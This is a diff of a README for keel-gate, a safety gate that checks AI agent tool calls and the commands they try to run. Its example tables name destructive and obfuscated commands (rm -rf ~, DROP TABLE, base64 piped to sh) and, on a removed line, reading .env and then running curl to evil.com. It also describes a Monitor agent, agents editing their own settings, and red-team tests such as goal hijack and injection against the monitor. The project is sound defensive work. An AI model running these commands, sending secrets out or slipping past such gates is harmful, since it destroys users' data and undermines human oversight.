@@ -3,79 +3,86 @@
 **A safety brake between AI agents and their tools. It stops actions you can't undo.**
 
 ```text
- AI agent ──► "DROP TABLE customers"  ──► keel-gate ──►  ✅ run          (safe)
-              "refund $500"                          ──►  📱 ask a human  (hard to undo)
-              "rm -rf ~"                             ──►  ⛔ block        (catastrophic)
+ AI agent ──► "ls -la"              ──► keel-gate ──►  ✅ run          (safe)
+              "refund $500"                       ──►  📱 ask a human  (hard to undo)
+              "rm -rf ~"                          ──►  ⛔ block        (catastrophic)
 ```
 
-> Status: **design phase**. The spec, contract, and decisions are ready for review; the code comes next.
-> Built for the Drawerrr AI Safety Challenge *Prevent irreversible autonomous actions*.
+> **Part of [Keel](https://github.com/MiladNalbandi/keel-v2).** keel-gate is Keel's action gate, moved into its own
+> repo for the Drawerrr AI Safety Challenge *Prevent irreversible autonomous actions*.
+>
+> **Status (Nov 10, 2026): working prototype.** Built and tested: the decision engine and the optional Monitor agent.
+> Next: approvals, mandates, protected paths, taint, egress, the demo, and the adapters. 🔜 marks planned parts.
 
 ## What it stops
 
-| The agent tries… | keel-gate does | Why |
-|---|---|---|
-| `rm -rf ~` or `DROP TABLE users` | ⛔ blocks | cannot be undone |
-| a $500 refund | 📱 asks a human, for this exact refund only | money leaves the company |
-| a $20 refund inside today's limit | ✅ runs | a human set the limit before (a *mandate*) |
-| reading `.env`, then `curl evil.com` | ⛔ blocks | secrets must not leave |
-| editing its own settings (`.claude/`, `.mcp.json`) | ⛔ blocks | an agent must not change its own rules |
+| The agent tries… | keel-gate today |
+|---|---|
+| `rm -rf ~`, `DROP TABLE users`, `git push --force origin main` | ⛔ blocks: these cannot be undone |
+| the same, hidden: `bash -c '…'`, base64 piped to `sh`, `"r""m" -rf ~` | ⛔ / 📱 parses the shell for real |
+| a $500 refund, `curl` to an unknown host | 📱 asks a human (one-time approval tokens 🔜) |
+| editing CI when you asked for a README summary | ⛔ / 📱 the optional Monitor agent flags it |
+| editing its own settings (`.claude/`, `.mcp.json`) | 🔜 protected paths (Day 2) |
+| reading `.env`, then sending it out | 📱 asks today; ⛔ with taint + egress 🔜 |
 
 When something is blocked, the model gets a clear tool error, so it can stop or ask you.
 
 ## Try it in 1 minute
 
 ```bash
-uv sync --all-extras
-uv run keel-gate demo          # runs a developer agent and a support agent in a fake world
-open demo/out/report.html      # see every decision: allowed, asked, blocked
+git clone https://github.com/MiladNalbandi/keel-gate && cd keel-gate
+uv sync
+uv run pytest -q               # 650 tests
+uv run pytest -q -m redteam    # attacks taken from real incidents
 ```
 
-## Use it with your agent
-
-**Claude API (Python)**: put the gate where your app runs tools:
+## Use it in your code
 
 ```python
-gate = Gate.from_dir("policies/")
-result = gate.run_tool_use(block, session)  # returns the tool_result to send back to Claude
+from keel_gate.domain.manifest import Manifest
+from keel_gate.domain.models import Session, ToolCall
+from keel_gate.gate import Gate
+
+schema = {"type": "object", "required": ["command"], "properties": {"command": {"type": "string"}}}
+shell = {"kind": "shell", "description": "Run a shell command.", "schema": schema}
+shell |= {"read_only": False, "state_changing": True, "reversible": False}
+gate = Gate(Manifest.from_mapping({"shell": shell}))
+decision = gate.decide(ToolCall("shell", {"command": "rm -rf ~"}), Session("s1", "dev-agent", workspace="/work"))
+print(decision.verdict, decision.message_for_model)  # deny  keel-gate blocked this call: recursive delete of '~' …
 ```
 
-**Claude Code**: add a `PreToolUse` hook in `.claude/settings.json` that runs `keel-gate hook`.
+Already running agents? Start in observe mode: [add to an existing system](docs/guides/integrate-existing-systems.md).
 
-**MCP (claude.ai and other clients)**: run `keel-gate mcp-proxy` in front of your MCP servers.
+## Want more control? Turn on the Monitor agent
 
-**Already running agents?** Start in observe mode and draft the manifest from your tools:
-[add to an existing system](docs/guides/integrate-existing-systems.md) · [manage rules](docs/guides/manage-rules-and-tools.md).
-
-More: [run it on Claude](docs/guides/protect-claude-code.md) · [OpenAI](docs/guides/protect-openai-app.md) ·
-[your own server](docs/guides/run-gate-service.md).
+An optional model reads the user's task and each call, and answers *fits*, *ask*, or *block*. It is a **read-only
+judge**: it has no tools, it can only make answers **stricter**, and if it fails the call asks a human. Choose how much
+it reviews: `off` · `approvals` · `changes` · `strict`. Read [the Monitor agent guide](docs/guides/monitor-agent.md).
 
 ## Overview
 
-Agents act fast and notice risk late. Even the best models stop correctly only about 60% of the time, and real agents have
-deleted production databases. keel-gate checks **every tool call before it runs**, outside the model.
+Agents act fast and notice risk late. In the challenge's own study, agents kept acting in 40.5% of cases where harm was
+possible, and real agents have deleted production databases. keel-gate checks **every tool call before it runs**,
+outside the model.
 
 ## Safety approach
 
-One fail-closed check per call:
-
-1. **Parse** the call (real shell parsing, not string matching).
-2. **Classify** its risk tier.
-3. **Check** taint, egress, identity, and protected paths.
-4. **Decide** allow / ask / deny; the strictest answer wins.
-
-Approvals are one-time and bound to the exact arguments. Every decision goes into a tamper-evident log.
+One fail-closed check per call: **parse** the call (a real shell parser, not string matching), **classify** its risk
+tier, apply the human-managed **rules**, and **decide** allow / ask / deny. The strictest answer wins, and no rule
+can weaken the safety floor. Optionally, the **Monitor agent** judges intent and can only raise the answer.
 Details: [how it works](docs/how-it-works.md).
 
 ## Evidence
 
-16 attack tests, each named after a real incident (Replit, PocketOS, GitHub MCP, Air Canada …), plus speed tests
-(target p99 < 1 ms). See [red-team results](docs/red-team.md) and [benchmarks](docs/benchmarks.md).
+- 650 tests, 94% coverage, type-checked (`mypy --strict`).
+- 9 of 22 attack tests named after real incidents run and pass today (Replit, Antigravity, Cursor, Ona, goal hijack,
+  injection against the monitor). See [red-team results](docs/red-team.md).
+- `decide()` p99 is 0.04 ms, 25 times under the 1 ms target. See [benchmarks](docs/benchmarks.md).
 
 ## Limitations
 
-It cannot judge intent *inside* an allowed action, and it is not an OS sandbox. Use both. Read
-[limitations](docs/limitations.md).
+It cannot judge intent inside an allowed action unless the Monitor agent is on, and the monitor is probabilistic. It is
+not an OS sandbox, so use both. Several layers are still planned. Read [limitations](docs/limitations.md).
 
 ## Learn more
 
